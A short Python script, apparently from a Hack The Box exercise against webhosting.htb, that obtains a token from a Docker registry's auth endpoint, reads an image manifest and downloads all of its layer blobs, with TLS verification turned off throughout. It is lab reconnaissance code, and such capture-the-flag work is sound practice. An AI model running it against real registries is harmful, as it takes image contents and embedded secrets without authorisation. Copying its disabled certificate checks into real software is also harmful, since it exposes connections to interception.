#!/bin/python3

import argparse
import requests
import os
import urllib3

# Disable InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_access_token(url):
    response = requests.get(url, verify=False)  # --insecure option is --verify=False in requests

    if response.status_code == 200:
        response_data = response.json()
        return response_data.get("access_token")

    print(f"Failed to get the access token. Status code: {response.status_code}")
    return None

def download_blob(registry_url, sha256, output_dir, access_token):
    headers = {"Authorization": f"Bearer {access_token}"}
    url = f"{registry_url}/v2/hosting-app/blobs/sha256:{sha256}"
    
    response = requests.get(url, headers=headers, verify=False)
    
    if response.status_code == 200:
        output_path = os.path.join(output_dir, sha256 + ".tar.gz")
        with open(output_path, "wb") as f:
            f.write(response.content)
        print(f"Downloaded blob {sha256} to {output_path}")
    else:
        print(f"Failed to download blob {sha256}. Status code: {response.status_code}")

def main():
    parser = argparse.ArgumentParser(description="Make cURL-like requests and extract access token")
    parser.add_argument("url_catalog", help="URL to fetch catalog data")
    parser.add_argument("url_auth", help="URL to fetch authentication data")
    args = parser.parse_args()

    # First cURL-like request to get the catalog data
    catalog_response = requests.get(args.url_catalog, verify=False)
#    print("Response from catalog request:")
#    print(catalog_response.text)

    # Second cURL-like request to get the authentication data
    auth_response = requests.get(args.url_auth, verify=False)
#    print("Response from auth request:")
#    print(auth_response.text)

    # Extract the access token from the auth response
    auth_response_data = auth_response.json()
    access_token = auth_response_data.get("access_token")

    print("Access token:")
    print(access_token)

    # Using the access token in the second request
    headers = {
        "Authorization": f"Bearer {access_token}",
    }
    catalog_response_with_token = requests.get(args.url_catalog, headers=headers, verify=False)

    print("Response from catalog request with access token:")
    print(catalog_response_with_token.text)

    # Handle catalog response to extract blob SHA256 values
    catalog_response_data = catalog_response_with_token.json()
    if "fsLayers" in catalog_response_data:
        blobs = [item["blobSum"].replace("sha256:", "") for item in catalog_response_data["fsLayers"]]
        print("List of blob SHA256 values:")
        print(blobs)

        # Download all blobs
        registry_url = "https://www.webhosting.htb:5000"
        output_dir = "blobs"  # Directory where you want to save the downloaded blobs
        for blob_sha256 in blobs:
            download_blob(registry_url, blob_sha256, output_dir, access_token)

if __name__ == "__main__":
    main()
